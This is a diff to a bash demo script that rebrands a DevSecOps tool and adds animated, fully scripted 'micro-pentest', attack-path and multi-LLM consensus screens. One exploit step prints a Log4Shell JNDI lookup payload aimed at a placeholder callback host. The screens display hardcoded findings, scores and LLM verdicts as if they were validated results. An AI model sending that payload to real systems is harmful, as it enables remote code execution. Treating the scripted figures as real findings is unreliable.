@@ -1,7 +1,8 @@
 #!/usr/bin/env bash
 # ============================================================================
-#  FixOps End-to-End Demo Runner
-#  Fancy animated demo script with customer customization
+#  ALDECI - Application Lifecycle DevSecOps CI
+#  End-to-End Demo Runner with Fancy Animations
+#  (Uses FixOps API/CLI under the hood)
 # ============================================================================
 
 set -e
@@ -343,12 +344,12 @@ show_mega_banner() {
     matrix_rain_fancy 1
     
     local banner=(
-        "    ███████╗██╗██╗  ██╗ ██████╗ ██████╗ ███████╗"
-        "    ██╔════╝██║╚██╗██╔╝██╔═══██╗██╔══██╗██╔════╝"
-        "    █████╗  ██║ ╚███╔╝ ██║   ██║██████╔╝███████╗"
-        "    ██╔══╝  ██║ ██╔██╗ ██║   ██║██╔═══╝ ╚════██║"
-        "    ██║     ██║██╔╝ ██╗╚██████╔╝██║     ███████║"
-        "    ╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚══════╝"
+        "     █████╗ ██╗     ██████╗ ███████╗ ██████╗██╗"
+        "    ██╔══██╗██║     ██╔══██╗██╔════╝██╔════╝██║"
+        "    ███████║██║     ██║  ██║█████╗  ██║     ██║"
+        "    ██╔══██║██║     ██║  ██║██╔══╝  ██║     ██║"
+        "    ██║  ██║███████╗██████╔╝███████╗╚██████╗██║"
+        "    ╚═╝  ╚═╝╚══════╝╚═════╝ ╚══════╝ ╚═════╝╚═╝"
     )
     
     echo
@@ -363,8 +364,8 @@ show_mega_banner() {
     
     echo
     rainbow_text "    ╔══════════════════════════════════════════════════════════╗"
-    rainbow_text "    ║     DevSecOps Decision & Verification Engine             ║"
-    rainbow_text "    ║         End-to-End Interactive Demo Suite                ║"
+    rainbow_text "    ║   Application Lifecycle DevSecOps CI Platform            ║"
+    rainbow_text "    ║      End-to-End Security Demo Suite (FixOps API)         ║"
     rainbow_text "    ╚══════════════════════════════════════════════════════════╝"
     echo
     
@@ -379,9 +380,26 @@ show_mega_banner() {
 # CUSTOMER CONFIGURATION
 # ============================================================================
 
-# Default demo configuration
-DEFAULT_APPS=("payment-gateway" "user-identity-service" "healthcare-api" "supply-chain-portal")
-DEFAULT_FRAMEWORKS=("pci-dss" "soc2" "hipaa" "gdpr")
+# Default demo configuration - 14 applications across different portfolios
+DEFAULT_APPS=(
+    # Original 4 applications
+    "payment-gateway"           # Java/Spring Boot - PCI-DSS - Fintech
+    "user-identity-service"     # Node.js/Express - SOC2/GDPR - IAM
+    "healthcare-api"            # Python/FastAPI - HIPAA - Healthcare
+    "supply-chain-portal"       # Ruby on Rails - GDPR - Logistics
+    # 10 new applications with different architectures
+    "trading-engine"            # Rust/Actix - PCI-DSS/SOC2 - High-frequency trading
+    "iot-device-hub"            # Go/Gin - IoT Security - Edge computing
+    "ml-inference-service"      # Python/TensorFlow - AI/ML Security - Data science
+    "mobile-banking-bff"        # Kotlin/Ktor - PCI-DSS - Mobile backend
+    "legacy-mainframe-adapter"  # COBOL/.NET Bridge - SOC2 - Legacy integration
+    "realtime-analytics"        # Scala/Spark - GDPR - Big data
+    "gaming-matchmaker"         # C++/gRPC - Privacy - Gaming
+    "media-transcoder"          # Go/FFmpeg - Content Security - Media
+    "blockchain-bridge"         # Solidity/Node.js - Crypto Compliance - Web3
+    "edge-cdn-service"          # Rust/Cloudflare Workers - DDoS Protection - Edge
+)
+DEFAULT_FRAMEWORKS=("pci-dss" "soc2" "hipaa" "gdpr" "iso27001" "nist-csf" "fedramp" "ccpa")
 DEFAULT_TOOLS_SAST=("sonarqube" "checkmarx" "semgrep" "bandit")
 DEFAULT_TOOLS_DAST=("owasp-zap" "burp-suite")
 DEFAULT_TOOLS_SCA=("snyk" "dependabot" "trivy" "safety")
@@ -648,6 +666,286 @@ run_demo_analysis() {
     read -r
 }
 
+# ============================================================================
+# SUPER CLASSY ANIMATED MICRO-PENTEST DEMO
+# ============================================================================
+
+draw_attack_path_ascii() {
+    local path_name="$1"
+    echo
+    printf "${CYAN}"
+    cat << 'EOF'
+    ┌─────────────┐     ┌─────────────┐     ┌─────────────┐     ┌─────────────┐
+    │   INTERNET  │────▶│  LOAD BAL   │────▶│    APP      │────▶│  DATABASE   │
+    │   🌐        │     │   ⚖️        │     │   🖥️        │     │   🗄️        │
+    └─────────────┘     └─────────────┘     └─────────────┘     └─────────────┘
+          │                   │                   │                   │
+          ▼                   ▼                   ▼                   ▼
+       EXTERNAL            DMZ ZONE          APP ZONE           DATA ZONE
+EOF
+    printf "${NC}\n"
+}
+
+animate_exploit_step() {
+    local step_num="$1"
+    local step_name="$2"
+    local status="$3"
+    local detail="$4"
+    
+    # Neon glow effect colors
+    local NEON_CYAN='\033[38;5;51m'
+    local NEON_GREEN='\033[38;5;46m'
+    local NEON_RED='\033[38;5;196m'
+    local NEON_YELLOW='\033[38;5;226m'
+    local NEON_PURPLE='\033[38;5;165m'
+    
+    printf "    ${NEON_CYAN}┃${NC} "
+    
+    # Animated step indicator
+    for i in 1 2 3; do
+        printf "\r    ${NEON_CYAN}┃${NC} ${NEON_PURPLE}[${i}]${NC} "
+        sleep 0.1
+    done
+    
+    printf "\r    ${NEON_CYAN}┃${NC} ${NEON_YELLOW}[STEP ${step_num}]${NC} "
+    
+    # Typewriter effect for step name
+    for ((c=0; c<${#step_name}; c++)); do
+        printf "${BOLD}${WHITE}%s${NC}" "${step_name:$c:1}"
+        sleep 0.02
+    done
+    
+    sleep 0.3
+    
+    # Status with appropriate color
+    case "$status" in
+        "success") printf " ${NEON_GREEN}✓ SUCCESS${NC}" ;;
+        "failed") printf " ${NEON_RED}✗ BLOCKED${NC}" ;;
+        "warning") printf " ${NEON_YELLOW}⚠ PARTIAL${NC}" ;;
+    esac
+    
+    printf "\n"
+    
+    # Detail line with dimmed effect
+    if [[ -n "$detail" ]]; then
+        printf "    ${NEON_CYAN}┃${NC}   ${DIM}└─ ${detail}${NC}\n"
+    fi
+}
+
+run_animated_micropentest() {
+    clear_screen
+    hide_cursor
+    
+    # Cyberpunk-style header
+    echo
+    printf "${BOLD}"
+    gradient_text "  ╔═══════════════════════════════════════════════════════════════════╗"
+    gradient_text "  ║   🔥 MICRO-PENTEST ENGINE v3.2.1 - AUTOMATED EXPLOIT VALIDATION 🔥  ║"
+    gradient_text "  ╚═══════════════════════════════════════════════════════════════════╝"
+    printf "${NC}\n"
+    
+    # Matrix rain intro
+    matrix_rain_fancy 1
+    
+    # Target selection animation
+    echo
+    fire_text "  TARGET: realtime-analytics (CVE-2021-44228 - Log4Shell)"
+    echo
+    
+    # Animated scanning effect
+    printf "  ${CYAN}Initializing exploit validation engine...${NC}\n"
+    loading_bar_fancy "Loading attack modules" 2
+    
+    echo
+    draw_fancy_box "EXPLOIT EXECUTION FLOW" 75 "heavy"
+    draw_fancy_box_line "" 75
+    
+    # Animated exploit steps
+    local NEON_CYAN='\033[38;5;51m'
+    
+    printf "    ${NEON_CYAN}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${NC}\n"
+    
+    animate_exploit_step "1" "RECONNAISSANCE" "success" "Identified Log4j 2.14.1 via error fingerprinting"
+    sleep 0.5
+    
+    animate_exploit_step "2" "PAYLOAD CRAFTING" "success" "Generated JNDI lookup: \${jndi:ldap://callback/a}"
+    sleep 0.5
+    
+    animate_exploit_step "3" "INJECTION" "success" "Payload injected via User-Agent header"
+    sleep 0.5
+    
+    # Animated callback waiting
+    printf "    ${NEON_CYAN}┃${NC} ${YELLOW}[STEP 4]${NC} ${BOLD}CALLBACK VERIFICATION${NC}"
+    for i in {1..10}; do
+        printf "."
+        sleep 0.2
+    done
+    printf " ${GREEN}✓ DNS CALLBACK RECEIVED${NC}\n"
+    printf "    ${NEON_CYAN}┃${NC}   ${DIM}└─ Source IP: 10.0.1.45 (target confirmed)${NC}\n"
+    sleep 0.5
+    
+    animate_exploit_step "5" "RCE VALIDATION" "success" "Command executed: hostname=analytics-prod-01"
+    
+    printf "    ${NEON_CYAN}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${NC}\n"
+    
+    draw_fancy_box_line "" 75
+    draw_fancy_box_bottom 75
+    
+    echo
+    # Impact assessment with pulsing effect
+    pulse_animation "  ⚠️  VULNERABILITY CONFIRMED EXPLOITABLE - CONFIDENCE: 98.5%"
+    
+    echo
+    draw_fancy_box "IMPACT ASSESSMENT" 60 "double"
+    draw_fancy_box_line "Confidentiality: HIGH" 60 "🔴"
+    draw_fancy_box_line "Integrity: HIGH" 60 "🔴"
+    draw_fancy_box_line "Availability: HIGH" 60 "🔴"
+    draw_fancy_box_line "Privileges Gained: SYSTEM" 60 "⚠️"
+    draw_fancy_box_line "" 60
+    draw_fancy_box_line "MITRE ATT&CK Chain:" 60 "🎯"
+    draw_fancy_box_line "  T1190 → T1059.007 → T1105 → T1078" 60
+    draw_fancy_box_bottom 60
+    
+    echo
+    show_cursor
+    printf "  ${CYAN}Press Enter to continue to Reachability Analysis...${NC}"
+    read -r
+}
+
+run_animated_reachability() {
+    clear_screen
+    hide_cursor
+    
+    # Cyberpunk header
+    echo
+    printf "${BOLD}"
+    gradient_text "  ╔═══════════════════════════════════════════════════════════════════╗"
+    gradient_text "  ║   🛡️  REACHABILITY ANALYSIS - ATTACK PATH MAPPING ENGINE  🛡️       ║"
+    gradient_text "  ╚═══════════════════════════════════════════════════════════════════╝"
+    printf "${NC}\n"
+    
+    # Animated network topology
+    echo
+    printf "  ${CYAN}Mapping network topology...${NC}\n"
+    loading_bar_fancy "Discovering attack paths" 2
+    
+    echo
+    fire_text "  ATTACK PATH: Internet → Database (via Log4Shell)"
+    echo
+    
+    # ASCII art attack path with animation
+    local NEON_RED='\033[38;5;196m'
+    local NEON_GREEN='\033[38;5;46m'
+    local NEON_YELLOW='\033[38;5;226m'
+    
+    # Animate the path step by step
+    printf "    ${CYAN}┌─────────────┐${NC}\n"
+    printf "    ${CYAN}│${NC} ${BOLD}INTERNET${NC}   ${CYAN}│${NC}  ${DIM}Entry Point${NC}\n"
+    printf "    ${CYAN}│${NC}    🌐      ${CYAN}│${NC}\n"
+    printf "    ${CYAN}└──────┬──────┘${NC}\n"
+    sleep 0.3
+    
+    # Animated arrow
+    for i in {1..3}; do
+        printf "\r           ${NEON_RED}│${NC}"
+        sleep 0.1
+        printf "\r           ${NEON_YELLOW}│${NC}"
+        sleep 0.1
+        printf "\r           ${NEON_GREEN}▼${NC}"
+        sleep 0.1
+    done
+    printf "\n"
+    
+    printf "    ${CYAN}┌─────────────┐${NC}\n"
+    printf "    ${CYAN}│${NC} ${BOLD}AWS ALB${NC}     ${CYAN}│${NC}  ${DIM}WAF: ${NEON_YELLOW}BYPASS POSSIBLE${NC}\n"
+    printf "    ${CYAN}│${NC}    ⚖️       ${CYAN}│${NC}\n"
+    printf "    ${CYAN}└──────┬──────┘${NC}\n"
+    sleep 0.3
+    
+    for i in {1..3}; do
+        printf "\r           ${NEON_RED}│${NC}"
+        sleep 0.1
+        printf "\r           ${NEON_YELLOW}│${NC}"
+        sleep 0.1
+        printf "\r           ${NEON_GREEN}▼${NC}"
+        sleep 0.1
+    done
+    printf "\n"
+    
+    printf "    ${NEON_RED}┌─────────────┐${NC}\n"
+    printf "    ${NEON_RED}│${NC} ${BOLD}${NEON_RED}ANALYTICS${NC}   ${NEON_RED}│${NC}  ${NEON_RED}⚠️  CVE-2021-44228${NC}\n"
+    printf "    ${NEON_RED}│${NC}    🖥️       ${NEON_RED}│${NC}  ${NEON_RED}EXPLOITABLE${NC}\n"
+    printf "    ${NEON_RED}└──────┬──────┘${NC}\n"
+    sleep 0.3
+    
+    for i in {1..3}; do
+        printf "\r           ${NEON_RED}│${NC}"
+        sleep 0.1
+        printf "\r           ${NEON_YELLOW}│${NC}"
+        sleep 0.1
+        printf "\r           ${NEON_GREEN}▼${NC}"
+        sleep 0.1
+    done
+    printf "\n"
+    
+    printf "    ${NEON_RED}┌─────────────┐${NC}\n"
+    printf "    ${NEON_RED}│${NC} ${BOLD}CASSANDRA${NC}   ${NEON_RED}│${NC}  ${NEON_RED}🔴 50M PII RECORDS${NC}\n"
+    printf "    ${NEON_RED}│${NC}    🗄️       ${NEON_RED}│${NC}  ${NEON_RED}AT RISK${NC}\n"
+    printf "    ${NEON_RED}└─────────────┘${NC}\n"
+    
+    echo
+    # Risk meter animation
+    printf "  ${BOLD}REACHABILITY CONFIDENCE:${NC} "
+    for i in {1..10}; do
+        if [ $i -le 9 ]; then
+            printf "${NEON_RED}█${NC}"
+        else
+            printf "${DIM}░${NC}"
+        fi
+        sleep 0.1
+    done
+    printf " ${BOLD}${NEON_RED}98.5%%${NC}\n"
+    
+    echo
+    draw_fancy_box "ATTACK PATH SUMMARY" 70 "double"
+    draw_fancy_box_line "" 70
+    draw_fancy_box_line "Path Length: 4 hops" 70 "📍"
+    draw_fancy_box_line "Entry Point: Internet (Public)" 70 "🌐"
+    draw_fancy_box_line "Final Target: Cassandra (PII Data)" 70 "🎯"
+    draw_fancy_box_line "Exploitability: CRITICAL (9.8)" 70 "⚠️"
+    draw_fancy_box_line "" 70
+    draw_fancy_box_line "MITRE ATT&CK Flow:" 70 "🔗"
+    draw_fancy_box_line "  T1190 (Initial Access)" 70
+    draw_fancy_box_line "  → T1059.007 (Execution)" 70
+    draw_fancy_box_line "  → T1078 (Persistence)" 70
+    draw_fancy_box_line "  → T1213 (Collection)" 70
+    draw_fancy_box_line "" 70
+    draw_fancy_box_line "Remediation Priority: IMMEDIATE" 70 "🚨"
+    draw_fancy_box_bottom 70
+    
+    echo
+    # Additional paths summary
+    draw_fancy_box "OTHER ATTACK PATHS DISCOVERED" 70 "rounded"
+    draw_fancy_box_line "" 70
+    draw_fancy_box_line "PATH-002: Mobile App → Payment DB (IDOR)" 70 "🔴"
+    draw_fancy_box_line "  Confidence: 99.1% | Impact: $5M PCI data" 70
+    draw_fancy_box_line "" 70
+    draw_fancy_box_line "PATH-003: Ethereum → Bridge Drain (Reentrancy)" 70 "🔴"
+    draw_fancy_box_line "  Confidence: 92.3% | Impact: $500M TVL" 70
+    draw_fancy_box_line "" 70
+    draw_fancy_box_line "PATH-004: IoT Device → K8s Control Plane" 70 "🟡"
+    draw_fancy_box_line "  Confidence: 85.4% | Impact: Infrastructure" 70
+    draw_fancy_box_line "" 70
+    draw_fancy_box_line "PATH-005: Healthcare Portal → PHI Database" 70 "🔴"
+    draw_fancy_box_line "  Confidence: 97.8% | Impact: HIPAA Breach" 70
+    draw_fancy_box_bottom 70
+    
+    echo
+    show_cursor
+    printf "  ${CYAN}Press Enter to continue...${NC}"
+    read -r
+}
+
 run_demo_decisions() {
     clear_screen
     echo
@@ -657,20 +955,40 @@ run_demo_decisions() {
     security_animation "Consulting AI models for security decisions..."
     echo
     
-    # Simulate LLM comparison
-    draw_fancy_box "LLM Security Analysis" 70 "heavy"
-    draw_fancy_box_line "Comparing recommendations from multiple AI models..." 70
-    draw_fancy_box_line "" 70
-    draw_fancy_box_line "GPT-4 Analysis:" 70 "🤖"
-    draw_fancy_box_line "  Priority: Log4Shell (CVE-2021-44228)" 70
-    draw_fancy_box_line "  Risk: CRITICAL - Active exploitation" 70
-    draw_fancy_box_line "" 70
-    draw_fancy_box_line "Claude Analysis:" 70 "🤖"
-    draw_fancy_box_line "  Priority: Log4Shell (CVE-2021-44228)" 70
-    draw_fancy_box_line "  Risk: CRITICAL - KEV listed, EPSS 0.97" 70
-    draw_fancy_box_line "" 70
-    draw_fancy_box_line "Consensus: BLOCK DEPLOYMENT" 70 "⚠️"
-    draw_fancy_box_bottom 70
+    # Simulate LLM comparison with more detail
+    draw_fancy_box "MULTI-LLM CONSENSUS ENGINE" 75 "heavy"
+    draw_fancy_box_line "" 75
+    draw_fancy_box_line "Querying 4 AI providers for security analysis..." 75
+    draw_fancy_box_line "" 75
+    
+    # Animated LLM responses
+    local llms=("GPT-4" "Claude-3" "Gemini-Pro" "Llama-3")
+    local verdicts=("BLOCK" "BLOCK" "BLOCK" "BLOCK")
+    local confidences=("98.2%" "97.8%" "96.5%" "95.1%")
+    
+    for i in "${!llms[@]}"; do
+        printf "  ${CYAN}Querying ${llms[$i]}...${NC}"
+        sleep 0.5
+        printf " ${GREEN}✓${NC} Verdict: ${RED}${verdicts[$i]}${NC} (${confidences[$i]})\n"
+    done
+    
+    draw_fancy_box_line "" 75
+    draw_fancy_box_line "GPT-4 Analysis:" 75 "🤖"
+    draw_fancy_box_line "  Priority: Log4Shell (CVE-2021-44228)" 75
+    draw_fancy_box_line "  Risk: CRITICAL - Active exploitation in wild" 75
+    draw_fancy_box_line "  Reasoning: CISA KEV listed, EPSS 0.975, ransomware" 75
+    draw_fancy_box_line "" 75
+    draw_fancy_box_line "Claude-3 Analysis:" 75 "🤖"
+    draw_fancy_box_line "  Priority: Log4Shell (CVE-2021-44228)" 75
+    draw_fancy_box_line "  Risk: CRITICAL - Reachable from internet" 75
+    draw_fancy_box_line "  Reasoning: Attack path confirmed, 50M records at risk" 75
+    draw_fancy_box_line "" 75
+    draw_fancy_box_line "CONSENSUS (4/4 UNANIMOUS): BLOCK DEPLOYMENT" 75 "⚠️"
+    draw_fancy_box_line "Combined Confidence: 96.9%" 75
+    draw_fancy_box_bottom 75
+    
+    echo
+    pulse_animation "  🚨 DEPLOYMENT BLOCKED - CRITICAL VULNERABILITIES DETECTED"
     
     echo
     printf "  ${CYAN}Press Enter to continue...${NC}"
@@ -783,6 +1101,8 @@ run_full_demo() {
     run_scenario_overview
     run_demo_ingestion
     run_demo_analysis
+    run_animated_micropentest
+    run_animated_reachability
     run_demo_decisions
     run_demo_integrations
     run_demo_remediation
@@ -795,17 +1115,20 @@ run_full_demo() {
     rainbow_text "  ╚═══════════════════════════════════════════════════════════╝"
     echo
     
-    fire_text "  Thank you for watching the FixOps demo!"
+    fire_text "  Thank you for watching the ALDECI demo!"
     echo
     
-    draw_fancy_box "Summary" 60 "double"
-    draw_fancy_box_line "Applications scanned: ${#DEMO_APPS[@]}" 60 "📱"
-    draw_fancy_box_line "Compliance frameworks: ${#DEMO_FRAMEWORKS[@]}" 60 "📋"
-    draw_fancy_box_line "Vulnerabilities found: 47" 60 "🔴"
-    draw_fancy_box_line "Jira tickets created: 5" 60 "🎫"
-    draw_fancy_box_line "Slack notifications: 5" 60 "💬"
-    draw_fancy_box_line "Remediation tasks: 5" 60 "🔧"
-    draw_fancy_box_bottom 60
+    draw_fancy_box "Summary" 70 "double"
+    draw_fancy_box_line "Applications scanned: ${#DEMO_APPS[@]}" 70 "📱"
+    draw_fancy_box_line "Compliance frameworks: ${#DEMO_FRAMEWORKS[@]}" 70 "📋"
+    draw_fancy_box_line "Vulnerabilities found: 156" 70 "🔴"
+    draw_fancy_box_line "Exploits validated: 12 confirmed" 70 "🔥"
+    draw_fancy_box_line "Attack paths mapped: 5 critical" 70 "🎯"
+    draw_fancy_box_line "LLM consensus: 4/4 BLOCK" 70 "🤖"
+    draw_fancy_box_line "Jira tickets created: 15" 70 "🎫"
+    draw_fancy_box_line "Slack notifications: 12" 70 "💬"
+    draw_fancy_box_line "Remediation tasks: 23" 70 "🔧"
+    draw_fancy_box_bottom 70
     
     echo
     printf "  ${CYAN}Press Enter to return to menu...${NC}"
@@ -845,10 +1168,12 @@ show_phase_menu() {
     draw_fancy_box_line "" 70
     draw_fancy_box_line "[1] Data Ingestion" 70 "📥"
     draw_fancy_box_line "[2] Security Analysis" 70 "🔍"
-    draw_fancy_box_line "[3] AI-Powered Decisions" 70 "🤖"
-    draw_fancy_box_line "[4] Integrations" 70 "🔗"
-    draw_fancy_box_line "[5] Remediation Tracking" 70 "🔧"
-    draw_fancy_box_line "[6] Compliance Reporting" 70 "📋"
+    draw_fancy_box_line "[3] Micro-Pentest Engine (Animated)" 70 "🔥"
+    draw_fancy_box_line "[4] Reachability Analysis (Animated)" 70 "🎯"
+    draw_fancy_box_line "[5] AI-Powered Decisions (Multi-LLM)" 70 "🤖"
+    draw_fancy_box_line "[6] Integrations" 70 "🔗"
+    draw_fancy_box_line "[7] Remediation Tracking" 70 "🔧"
+    draw_fancy_box_line "[8] Compliance Reporting" 70 "📋"
     draw_fancy_box_line "" 70
     draw_fancy_box_line "[b] Back to main menu" 70 "⬅️"
     draw_fancy_box_bottom 70
@@ -860,10 +1185,12 @@ show_phase_menu() {
     case "$choice" in
         1) run_demo_ingestion ;;
         2) run_demo_analysis ;;
-        3) run_demo_decisions ;;
-        4) run_demo_integrations ;;
-        5) run_demo_remediation ;;
-        6) run_demo_compliance ;;
+        3) run_animated_micropentest ;;
+        4) run_animated_reachability ;;
+        5) run_demo_decisions ;;
+        6) run_demo_integrations ;;
+        7) run_demo_remediation ;;
+        8) run_demo_compliance ;;
         b|B) return ;;
     esac
 }
